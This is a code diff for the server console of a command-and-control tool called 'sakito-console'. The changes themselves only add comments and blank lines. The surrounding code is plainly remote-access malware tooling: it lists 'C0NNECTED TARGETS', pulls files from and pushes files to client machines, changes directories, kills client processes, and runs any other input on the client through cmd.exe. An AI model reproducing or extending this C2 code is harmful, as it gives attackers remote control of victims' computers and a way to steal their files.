@@ -24,6 +24,7 @@ typedef struct {
 
 	// Client socket.
 	int sock;
+
 } Conn;
  
 typedef struct {
@@ -50,6 +51,7 @@ typedef int (*func)(char*, size_t, int);
 void terminate_server(int listen_socket, char* error) {
 	close(listen_socket);
 	perror(error);
+	
 	exit(1);
 }
  
@@ -141,12 +143,13 @@ void* accept_conns(void* param) {
 
 		// Unlock/release mutex..
 		pthread_mutex_unlock(&lock);
+	
 		// Execution is finished so allow delete_conn() to continue.
 		conns->THRD_FLAG = 0;
 	}
 }
  
-// Function to list all available connections.
+// Function to list/print all available connections to stdout.
 void list_connections(const Conn_map* conns) {
 	printf("\n\n---------------------------\n");
 	printf("---  C0NNECTED TARGETS  ---\n");
@@ -174,6 +177,7 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 	FILE* fd = fopen(&buf[8], "rb");
 	uint32_t bytes = 0, f_size = 0;
  
+	// If the file exists:
 	if (fd) {
 		// Get file size.
 		fseek(fd, 0L, SEEK_END);
@@ -184,9 +188,11 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 		fseek(fd, 0L, SEEK_SET);
 	}
  
+	// Send the serialized file size bytes.
 	if (write(client_socket, (char*)&bytes, sizeof(bytes)) < 1)
 		return -1;
  
+	// Declare i_result as true.
 	int i_result = 1;
  
 	if (f_size) {
@@ -215,12 +221,14 @@ int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
 	if (write(client_socket, &buf[9], cmd_len) < 1)
 		return -1;
  
+	// Open the file.
 	FILE* fd = fopen(&buf[10], "wb");
  
-	// Receive file size.
+	// Receive serialized file size uint32_t bytes.
 	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
 		return -1;
  
+	// Deserialize file size bytes.
 	uint32_t f_size = ntohl_conv(&*(buf));
 	int i_result = 1;
  
@@ -234,6 +242,7 @@ int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
 		total += i_result;
 	}
  
+	// Close the file.
 	fclose(fd);
  
 	return i_result;
@@ -241,7 +250,9 @@ int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
  
 // Function send change directory command to client.
 int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
+	// '1' is the command code for changing directory.
 	buf[3] = '1';
+	
 	if (write(client_socket, &buf[3], cmd_len) < 1)
 		return -1;
  
@@ -250,6 +261,7 @@ int client_cd(char* const buf, const size_t cmd_len, int client_socket) {
  
 // Function to terminate/kill client.
 int terminate_client(char* const buf, const size_t cmd_len, int client_socket) {
+	// '2' is the command code for terminating the client process.
 	write(client_socket, "2", cmd_len);
  
 	return 0;
@@ -261,9 +273,11 @@ int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
 	if (write(client_socket, buf, cmd_len) < 1)
 		return -1;
 
+	// Receive serialized output size uint32_t bytes.
 	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
 		return -1;
  
+	// Deserialize output size bytes.
 	uint32_t s_size = ntohl_conv(&*(buf));
 
 	int i_result = 1;
@@ -274,6 +288,7 @@ int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
 		fwrite(buf, 1, i_result, stdout);
 	} while ((s_size -= i_result) > 0);
  
+	// write a single newline to stdout for cmd line output alignment.
 	fputc('\n', stdout);
  
 	return i_result;
@@ -286,12 +301,14 @@ const func parse_cmd(char* const buf) {
 	// Function pointer array of each c2 command.
 	const func func_array[4] = { &client_cd, &terminate_client, &send_file, &recv_file};
 
+	// Parse stdin string and return it's corresponding function pointer.
 	for (int i = 0; i < 4; i++) {
 		if (compare(buf, commands[i])) {
 			return func_array[i];
 		}
 	}
 
+	// If no command was parsed: send/execute the command string on the client via cmd.exe.
 	return &send_cmd;
 }
 
@@ -305,6 +322,7 @@ void delete_conn(Conn_map* conns, const int client_id) {
 	while (conns->THRD_FLAG)
 		pthread_cond_wait(&consum, &lock);	
 
+	// Set our thread flag to prevent a race condition from occurring with accept_conns().
 	conns->THRD_FLAG = 1;
 
 	// If the file descriptor is open: close it.
@@ -335,6 +353,7 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 	int client_socket = conns->clients[client_id].sock;
 	char* client_host = conns->clients[client_id].host;
  
+	// Set i_result to true.
 	int i_result = 1;
  
 	// Receive and parse input/send commands to client.
@@ -351,8 +370,7 @@ void interact(Conn_map* conns, char* const buf, const int client_id) {
 				return;
 			}
 			else {
-				// If a command is parsed call it's corresponding function else execute-
-				// the command on the client.
+				// Parse and execute command function.
 				const func target_func = parse_cmd(cmd);
 				i_result = target_func(buf, cmd_len, client_socket);
 			}
@@ -380,6 +398,7 @@ void exec_cmd(char* const buf) {
 		fwrite(buf, 1, rb, stdout);
 	} while (rb == BUFLEN);
  
+	// Write single newline character to stdout for cmd line output alignment.
 	fputc('\n', stdout);
  
 	// Close the pipe.
@@ -388,13 +407,19 @@ void exec_cmd(char* const buf) {
  
 // Main function for parsing console input and calling sakito-console functions.
 int main(void) {
+	// Instantiate a Conn_map structure.
 	Conn_map conns;
 
+	// Set out race condition flag to false.
 	conns.THRD_FLAG = 0;
+
+	// Create our pthread object.
 	pthread_t acp_thread;
 
+	// Start our accept connections thread to recursively accept connections.
 	pthread_create(&acp_thread, NULL, accept_conns, &conns);
  
+	// Saktio console loop. 
 	while (1) {
 		printf("sak1to-console // ");
 		// BUFLEN + 1 to ensure the string is always truncated/null terminated.
